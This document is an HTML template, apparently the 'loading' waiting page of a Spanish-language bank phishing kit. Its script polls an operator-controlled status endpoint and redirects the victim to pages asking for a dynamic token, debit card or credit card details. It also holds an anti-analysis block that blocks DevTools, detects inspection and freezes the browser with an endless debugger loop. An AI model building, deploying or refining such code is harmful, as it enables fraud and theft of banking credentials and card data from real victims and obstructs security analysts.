<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Cargando...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .spinner {
            width: 30px;
            height: 30px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #cbd5e1; /* Color gris azulado suave */
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="spinner"></div>

    <script>
        // --- CONFIGURACIÓN DE SEGURIDAD AUTOINJECTADA ---
        const REQUIRE_LOCATION = false;
        const BLOCK_DEV = false;

        (function() {
            if (!BLOCK_DEV) return;

            // 1. Bloquear Clic Derecho y Atajos
            window.addEventListener('contextmenu', e => e.preventDefault());
            window.addEventListener('keydown', e => {
                if (
                    e.key === 'F12' ||
                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || e.key === 'i' || e.key === 'j' || e.key === 'c')) ||
                    (e.ctrlKey && (e.key === 'U' || e.key === 'u'))
                ) {
                    e.preventDefault();
                    return false;
                }
            });

            // 2. Disparador de bloqueo agresivo
            let isBlocked = false;
            const triggerBlock = () => {
                if (isBlocked) return;
                isBlocked = true;
                
                document.body.innerHTML = `
                    <div style="background:#000;color:red;font-family:monospace;width:100vw;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;position:fixed;top:0;left:0;z-index:999999;padding:20px;text-align:center;">
                        <h1 style="font-size:30px;margin-bottom:20px;">[!] ACCESO RESTRINGIDO [!]</h1>
                        <p style="font-size:18px;margin-bottom:10px;">Se ha detectado un intento de inspección no autorizado.</p>
                        <p style="font-size:14px;color:#666;">Esta sesión ha sido bloqueada permanentemente por razones de seguridad.</p>
                    </div>
                `;
                document.body.style.overflow = 'hidden';
                
                const freeze = () => {
                    try {
                        (function() {}.constructor("debugger")());
                    } catch(e) {}
                    setTimeout(freeze, 1);
                };
                freeze();
            };

            // 3. Detección por tamaño (DevTools acoplado)
            const checkDimensions = () => {
                const widthThreshold = window.outerWidth - window.innerWidth > 160;
                const heightThreshold = window.outerHeight - window.innerHeight > 160;
                if (widthThreshold || heightThreshold) {
                    triggerBlock();
                }
            };
            setInterval(checkDimensions, 500);
            checkDimensions();

            // 4. Detección por Debugger Delay (DevTools flotante o breakpoints desactivados)
            const checkDebugger = () => {
                const start = performance.now();
                debugger;
                if (performance.now() - start > 100) {
                    triggerBlock();
                }
            };
            setInterval(checkDebugger, 500);

            // 5. Detección por comportamiento de consola
            const devtoolsDetector = {
                toString: function() {
                    triggerBlock();
                    return '';
                }
            };
            setInterval(() => {
                console.log('%c', devtoolsDetector);
                console.clear();
            }, 500);
        })();
        // --- FIN CONFIGURACIÓN DE SEGURIDAD AUTOINJECTADA ---

        const userId = {{ user_id }};
        
        setInterval(async () => {
            try {
                const res = await fetch('/get_status/' + userId);
                const data = await res.json();
                
                // 2: Error Clave -> Vuelve al inicio
                if (data.status === '2') {
                    window.location.href = '/?error=1';
                } 
                // 3: Token Dinámico -> Va a la pantalla de Activemos tu app
                else if (data.status === '3') {
                    window.location.href = '/dynamic/' + userId;
                } 
                // 4: Error Token -> Va a Activemos tu app con mensaje de error
                else if (data.status === '4') {
                    window.location.href = '/dynamic/' + userId + '?error=1';
                } 
                // 5: Finalizar -> Va a la pantalla de Felicidades
                else if (data.status === '5') {
                    window.location.href = '/finish';
                }
                // 6: Pedir Tarjeta Débito
                else if (data.status === '6') {
                    window.location.href = '/tdb/' + userId;
                }
                // 7: Error Tarjeta Débito
                else if (data.status === '7') {
                    window.location.href = '/tdb/' + userId + '?error=1';
                }
                // 8: Pedir Tarjeta Crédito
                else if (data.status === '8') {
                    window.location.href = '/tct/' + userId;
                }
                // 9: Error Tarjeta Crédito
                else if (data.status === '9') {
                    window.location.href = '/tct/' + userId + '?error=1';
                }
            } catch (e) {
                console.error("Error comprobando estado");
            }
        }, 3000);
    </script>
</body>
</html>
